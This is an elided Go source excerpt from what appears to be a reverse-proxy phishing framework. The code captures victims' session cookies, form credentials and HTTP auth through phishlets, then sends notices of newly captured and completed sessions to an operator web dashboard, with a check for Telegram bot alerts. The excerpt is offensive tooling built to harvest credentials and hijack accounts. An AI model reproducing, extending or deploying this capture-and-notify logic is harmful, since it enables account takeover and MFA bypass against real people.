...
func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	...
	p.webServer = NewWebServer(cfg, db, p)
						...
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								...
								if err == nil {
									...
									// Notify web dashboard of new session
									if dbSession, err := p.db.GetSessionById(sid); err == nil {
										p.webServer.NotifyNewSession(dbSession)
									}
			...
			if is_cookie_auth && is_body_auth && is_http_auth {
				...
				if s, ok := p.sessions[ps.SessionId]; ok {
					if !s.IsDone {
						...
						if p.cfg.GetTelegramEnabled() && p.cfg.GetTelegramBotToken() != "" && p.cfg.GetTelegramChatId() != "" {
						...
						// Notify web dashboard of session update
						if dbSession, err := p.db.GetSessionById(ps.Index); err == nil {
							p.webServer.NotifySessionUpdate(dbSession)
						}
